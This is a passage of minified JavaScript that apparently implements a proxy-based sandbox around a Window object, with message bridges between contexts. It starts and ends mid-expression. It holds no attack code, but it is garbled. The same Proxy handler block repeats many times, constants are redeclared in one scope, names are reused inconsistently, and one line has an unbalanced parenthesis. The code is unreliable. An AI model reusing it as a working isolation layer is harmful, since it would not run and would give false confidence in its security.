                        a.setMessageListener(e)
                    }
                    ,
                    cleanup: ()=>{
                        a.cleanup()
                    }
                };
                return l
            }
            )((e=>{
                const t = {};
                return e.send && (t.send = e.send),
                e.once && (t.once = e.once),
                e.setMessageListener && (t.setMessageListener = e.setMessageListener),
                t
            }
            )(n)),
            r.bridges.second = i,
            {
                createProxy: e=>{
                    let t = r;
                    const n = e=>{
                        let o, n;
                        const r = (o = Nt(t, e)) || (n = Nt(s, e));
                        return Gt({
                            d: r,
                            l: !!o,
                            w: !!n
                        });
                    }
                      , o = e=>{
                        if (!a(e))
                            return !1;
                        if ("length" === e)
                            return !0;
                        const t = wt($n(e));
                        return t >= 0 && t <= rn && e === `${t}`
                    }
                      , r = e=>"on" === mn(e, 0, 2)
                      , i = (e,t)=>{
                        const n = mn(e, 2)
                          , i = d[n];
                        if (i && (t.removeEventListener(n, i),
                        delete d[n]),
                        t && (e=>"function" == typeof e)(t)) {
                            const e = (...e)=>Rt(t, s, e);
                            t.addEventListener(n, e),
                            d[n] = e
                        }
                    }
                      , s = Gt({})
                      , a = Gt({})
                      , u = new Un(a,Gt({
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = n(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && u[t] || o && o.get && !o.set ? (vt(r ? a : s, t, s),
                            !1) : (vt(a, t, s),
                            a[t] && a[t].configurable && a[t].writable && a[t].value && "function" == typeof a[t].value && !p(a[t].value) && (a[t].value = Gt(a[t].value)),
                            a[t] && !a[t].configurable && "function" == typeof a[t].get && !p(a[t].get) && (a[t].get = Gt(a[t].get)),
                            a[t] && !a[t].configurable && "function" == typeof a[t].set && !p(a[t].set) && (a[t].set = Gt(a[t].set)),
                            delete u[t],
                            !0)
                        }
                        ,
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = a[t];
                            return !(!n || !n.configurable) && (o && (o = delete s[t],
                            a[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete a[t]),
                            delete s[t],
                            o || r)
                        }
                        ,
                        get: (e,t)=>{
                            const o = s[t];
                            if (o) {
                                if (o.once && delete s[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = a[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = a[t];
                            if (!o) {
                                const e = s[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!a(t))
                                    return;
                                o = Nt(s, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = s),
                                    Gt(t)
                                }
                                )
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in s || t in a,
                        ownKeys: ()=>{
                            const e = e=>!(e in u)
                              , t = gt(u)
                              , n = Ft(gt(ht(s)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(a, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        set: (e,t,n)=>{
                            const o = s[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = a[t];
                            return !(d && !d.writable && !It(d, "set") || a(t) || (delete s[t],
                            vt(a, t, n),
                            a[t] && a[t].configurable && a[t].writable && a[t].value && "function" == typeof a[t].value && !p(a[t].value) && (a[t].value = Gt(a[t].value)),
                            a[t] && !a[t].configurable && "function" == typeof a[t].get && !p(a[t].get) && (a[t].get = Gt(a[t].get)),
                            a[t] && !a[t].configurable && "function" == typeof a[t].set && !p(a[t].set) && (a[t].set = Gt(a[t].set)),
                            0))
                        }
                    }));
                    Ht(gt(u), (e=>{
                        s[e] = s[e] || Gt({
                            bind: !0
                        })
                    }
                    ));
                    const c = Gt({})
                      , d = Gt({});
                    Lt(d, hn, "Window");
                    const f = new Un(d,Gt({
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && c[t] || o && o.get && !o.set ? (vt(r ? d : zn, t, s),
                            !1) : (vt(d, t, s),
                            d[t] && d[t].configurable && d[t].writable && d[t].value && "function" == typeof d[t].value && !p(d[t].value) && (d[t].value = Gt(d[t].value)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].get && !p(d[t].get) && (d[t].get = Gt(d[t].get)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].set && !p(d[t].set) && (d[t].set = Gt(d[t].set)),
                            delete c[t],
                            !0)
                        }
                        ,
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = d[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            d[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete d[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = d[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = d[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(d, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in zn || t in d,
                        ownKeys: ()=>{
                            const e = e=>!(e in c)
                              , t = gt(c)
                              , n = Ft(gt(ht(zn)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(d, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        set: (e,t,n)=>{
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = d[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                            vt(d, t, n),
                            d[t] && d[t].configurable && d[t].writable && d[t].value && "function" == typeof d[t].value && !p(d[t].value) && (d[t].value = Gt(d[t].value)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].get && !p(d[t].get) && (d[t].get = Gt(d[t].get)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].set && !p(d[t].set) && (d[t].set = Gt(d[t].set)),
                            0))
                        }
                    }));
                    Ht(gt(f), (e=>{
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }
                    ));
                    const c = Gt({})
                      , d = Gt({});
                    Lt(d, hn, "Window");
                    const g = new Un(d,Gt({
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && c[t] || o && o.get && !o.set ? (vt(r ? d : zn, t, s),
                            !1) : (vt(d, t, s),
                            d[t] && d[t].configurable && d[t].writable && d[t].value && "function" == typeof d[t].value && !p(d[t].value) && (d[t].value = Gt(d[t].value)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].get && !p(d[t].get) && (d[t].get = Gt(d[t].get)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].set && !p(d[t].set) && (d[t].set = Gt(d[t].set)),
                            delete c[t],
                            !0)
                        }
                        ,
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = d[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            d[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete d[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = d[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = d[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(d, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in zn || t in d,
                        ownKeys: ()=>{
                            const e = e=>!(e in c)
                              , t = gt(c)
                              , n = Ft(gt(ht(zn)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(d, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        set: (e,t,n)=>{
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = d[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                            vt(d, t, n),
                            d[t] && d[t].configurable && d[t].writable && d[t].value && "function" == typeof d[t].value && !p(d[t].value) && (d[t].value = Gt(d[t].value)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].get && !p(d[t].get) && (d[t].get = Gt(d[t].get)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].set && !p(d[t].set) && (d[t].set = Gt(d[t].set)),
                            0))
                        }
                    }));
                    return g
                }
                )({
                    sendPrefix: r.sendPrefix,
                    listenPrefix: r.listenPrefix
                });
                let p = null;
                const h = ((t,n)=>{
                    const o = Gt({});
                    Ht(gt(n), (t=>{
                        vt(o, t, Gt(e[t]))
                    }
                    ));
                    const r = {
                        send: (e,t)=>{
                            const s = Gt({
                                m: e,
                                a: t,
                                r: null
                            });
                            o.send(n.sendPrefix, s)
                        }
                        ,
                        once: (e,t)=>{
                            o.once(n.listenPrefix, (n=>{
                                t.once(e, n)
                            }
                            ))
                        }
                        ,
                        setMessageListener: e=>{
                            o.setMessageListener((t=>{
                                const o = t.m
                                  , r = t.a;
                                "ack" === o ? e(null, r) : e({
                                    method: o,
                                    args: r
                                })
                            }
                            ))
                        }
                        ,
                        cleanup: ()=>{
                            o.cleanup(),
                            p && p()
                        }
                    };
                    return r
                }
                )({
                    sendPrefix: t.sendPrefix,
                    listenPrefix: t.listenPrefix
                }, a);
                const m = {
                    send: (e,t)=>{
                        h.send(e, t)
                    }
                    ,
                    once: (e,t)=>{
                        h.once(e, t)
                    }
                    ,
                    setMessageListener: e=>{
                        h.setMessageListener(e)
                    }
                    ,
                    cleanup: ()=>{
                        h.cleanup()
                    }
                };
                return m
            }
            )((e=>{
                const t = {};
                return e.send && (t.send = e.send),
                e.once && (t.once = e.once),
                e.setMessageListener && (t.setMessageListener = e.setMessageListener),
                t
            }
            )(a)),
            r.bridges.third = a,
            {
                createProxy: e=>{
                    let t = r;
                    const n = e=>{
                        let o, n;
                        const r = (o = Nt(t, e)) || (n = Nt(s, e));
                        return Gt({
                            d: r,
                            l: !!o,
                            w: !!n
                        })
                    }
                      , o = e=>{
                        if (!l(e))
                            return !1;
                        if ("length" === e)
                            return !0;
                        const t = wt($n(e));
                        return t >= 0 && t <= rn && e === `${t}`
                    }
                      , r = e=>"on" === mn(e, 0, 2)
                      , i = (e,t)=>{
                        const n = mn(e, 2)
                          , i = d[n];
                        if (i && (t.removeEventListener(n, i),
                        delete d[n]),
                        t && (e=>"function" == typeof e)(t)) {
                            const e = (...e)=>Rt(t, s, e);
                            t.addEventListener(n, e),
                            d[n] = e
                        }
                    }
                      , s = Gt({})
                      , a = Gt({})
                      , u = new Un(a,Gt({
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = n(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && a[t] || o && o.get && !o.set ? (vt(r ? a : s, t, s),
                            !1) : (vt(a, t, s),
                            a[t] && a[t].configurable && a[t].writable && a[t].value && "function" == typeof a[t].value && !p(a[t].value) && (a[t].value = Gt(a[t].value)),
                            a[t] && !a[t].configurable && "function" == typeof a[t].get && !p(a[t].get) && (a[t].get = Gt(a[t].get)),
                            a[t] && !a[t].configurable && "function" == typeof a[t].set && !p(a[t].set) && (a[t].set = Gt(a[t].set)),
                            delete u[t],
                            !0)
                        }
                        ,
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = a[t];
                            return !(!n || !n.configurable) && (o && (o = delete s[t],
                            a[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete a[t]),
                            delete s[t],
                            o || r)
                        }
                        ,
                        get: (e,t)=>{
                            const o = s[t];
                            if (o) {
                                if (o.once && delete s[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = a[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = a[t];
                            if (!o) {
                                const e = s[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!u(t))
                                    return;
                                o = Nt(s, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = s),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(a, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in s || t in a,
                        ownKeys: ()=>{
                            const e = e=>!(e in c)
                              , t = gt(c)
                              , n = Ft(gt(ht(s)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(a, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        set: (e,t,n)=>{
                            const o = s[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = a[t];
                            return !(d && !d.writable && !It(d, "set") || u(t) || (delete s[t],
                            vt(a, t, n),
                            a[t] && a[t].configurable && a[t].writable && a[t].value && "function" == typeof a[t].value && !p(a[t].value) && (a[t].value = Gt(a[t].value)),
                            a[t] && !a[t].configurable && "function" == typeof a[t].get && !p(a[t].get) && (a[t].get = Gt(a[t].get)),
                            a[t] && !a[t].configurable && "function" == typeof a[t].set && !p(a[t].set) && (a[t].set = Gt(a[t].set)),
                            0))
                        }
                    }));
                    Ht(gt(u), (e=>{
                        s[e] = s[e] || Gt({
                            bind: !0
                        })
                    }
                    ));
                    const c = Gt({})
                      , d = Gt({});
                    Lt(d, hn, "Window");
                    const g = new Un(d,Gt({
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && c[t] || o && o.get && !o.set ? (vt(r ? d : zn, t, s),
                            !1) : (vt(d, t, s),
                            d[t] && d[t].configurable && d[t].writable && d[t].value && "function" == typeof d[t].value && !p(d[t].value) && (d[t].value = Gt(d[t].value)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].get && !p(d[t].get) && (d[t].get = Gt(d[t].get)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].set && !p(d[t].set) && (d[t].set = Gt(d[t].set)),
                            delete c[t],
                            !0)
                        }
                        ,
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = d[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            d[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete d[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = d[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = d[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(d, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in zn || t in d,
                        ownKeys: ()=>{
                            const e = e=>!(e in c)
                              , t = gt(c)
                              , n = Ft(gt(ht(zn)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(d, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        set: (e,t,n)=>{
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = d[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                            vt(d, t, n),
                            d[t] && d[t].configurable && d[t].writable && d[t].value && "function" == typeof d[t].value && !p(d[t].value) && (d[t].value = Gt(d[t].value)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].get && !p(d[t].get) && (d[t].get = Gt(d[t].get)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].set && !p(d[t].set) && (d[t].set = Gt(d[t].set)),
                            0))
                        }
                    }));
                    Ht(gt(g), (e=>{
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }));
                    const p = Gt({})
                      , v = Gt({});
                    Lt(v, hn, "Window");
                    const b = new Un(v,Gt({
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && p[t] || o && o.get && !o.set ? (vt(r ? v : p, t, s),
                            !1) : (vt(v, t, s),
                            v[t] && v[t].configurable && v[t].writable && v[t].value && "function" == typeof v[t].value && !p(v[t].value) && (v[t].value = Gt(v[t].value)),
                            v[t] && !v[t].configurable && "function" == typeof v[t].get && !p(v[t].get) && (v[t].get = Gt(v[t].get)),
                            v[t] && !v[t].configurable && "function" == typeof v[t].set && !p(v[t].set) && (v[t].set = Gt(v[t].set)),
                            delete p[t],
                            !0)
                        }
                        ,
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = v[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            v[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete v[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = v[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = v[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(v, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in zn || t in v,
                        ownKeys: ()=>{
                            const e = e=>!(e in p)
                              , t = gt(p)
                              , n = Ft(gt(ht(zn)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(v, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        set: (e,t,n)=>{
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = v[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                            vt(v, t, n),
                            v[t] && v[t].configurable && v[t].writable && v[t].value && "function" == typeof v[t].value && !p(v[t].value) && (v[t].value = Gt(v[t].value)),
                            v[t] && !v[t].configurable && "function" == typeof v[t].get && !p(v[t].get) && (v[t].get = Gt(v[t].get)),
                            v[t] && !v[t].configurable && "function" == typeof v[t].set && !p(v[t].set) && (v[t].set = Gt(v[t].set)),
                            0))
                        }
                    }));
                    Ht(gt(b), (e=>{
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }));
                    const w = Gt({})
                      , y = Gt({});
                    Lt(y, hn, "Window");
                    const E = new Un(y,Gt({
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && w[t] || o && o.get && !o.set ? (vt(r ? y : w, t, s),
                            !1) : (vt(y, t, s),
                            y[t] && y[t].configurable && y[t].writable && y[t].value && "function" == typeof y[t].value && !p(y[t].value) && (y[t].value = Gt(y[t].value)),
                            y[t] && !y[t].configurable && "function" == typeof y[t].get && !p(y[t].get) && (y[t].get = Gt(y[t].get)),
                            y[t] && !y[t].configurable && "function" == typeof y[t].set && !p(y[t].set && (y[t].set = Gt(y[t].set)),
                            delete w[t],
                            !0)
                        }
                        ,
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = y[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            y[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete y[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = y[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = y[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(y, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in zn || t in y,
                        ownKeys: ()=>{
                            const e = e=>!(e in w)
                              , t = gt(w)
                              , n = Ft(gt(ht(zn)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(y, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        set: (e,t,n)=>{
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = y[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                            vt(y, t, n),
                            y[t] && y[t].configurable && y[t].writable && y[t].value && "function" == typeof y[t].value && !p(y[t].value) && (y[t].value = Gt(y[t].value)),
                            y[t] && !y[t].configurable && "function" == typeof y[t].get && !p(y[t].get) && (y[t].get = Gt(y[t].get)),
                            y[t] && !y[t].configurable && "function" == typeof y[t].set && !p(y[t].set) && (y[t].set = Gt(y[t].set)),
                            0))
                        }
                    }));
                    Ht(gt(E), (e=>{
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }));
                    const S = Gt({})
                      , T = Gt({});
                    Lt(T, hn, "Window");
                    const O = new Un(T,Gt({
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && S[t] || o && o.get && !o.set ? (vt(r ? T : S, t, s),
                            !1) : (vt(T, t, s),
                            T[t] && T[t].configurable && T[t].writable && T[t].value && "function" == typeof T[t].value && !p(T[t].value) && (T[t].value = Gt(T[t].value)),
                            T[t] && !T[t].configurable && "function" == typeof T[t].get && !p(T[t].get) && (T[t].get = Gt(T[t].get)),
                            T[t] && !T[t].configurable && "function" == typeof T[t].set && !p(T[t].set) && (T[t].set = Gt(T[t].set)),
                            delete S[t],
                            !0)
                        }
                        ,
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = T[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            T[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete T[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = T[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = T[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(T, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in zn || t in T,
                        ownKeys: ()=>{
                            const e = e=>!(e in S)
                              , t = gt(S)
                              , n = Ft(gt(ht(zn)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(T, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        set: (e,t,n)=>{
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = T[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                            vt(T, t, n),
                            T[t] && T[t].configurable && T[t].writable && T[t].value && "function" == typeof T[t].value && !p(T[t].value) && (T[t].value = Gt(T[t].value)),
                            T[t] && !T[t].configurable && "function" == typeof T[t].get && !p(T[t].get) && (T[t].get = Gt(T[t].get)),
                            T[t] && !T[t].configurable && "function" == typeof T[t].set && !p(T[t].set) && (T[t].set = Gt(T[t].set)),
                            0))
                        }
                    }));
                    Ht(gt(O), (e=>{
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }));
                    const x = Gt({})
                      , C = Gt({});
                    Lt(C, hn, "Window");
                    const P = new Un(C,Gt({
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && x[t] || o && o.get && !o.set ? (vt(r ? C : x, t, s),
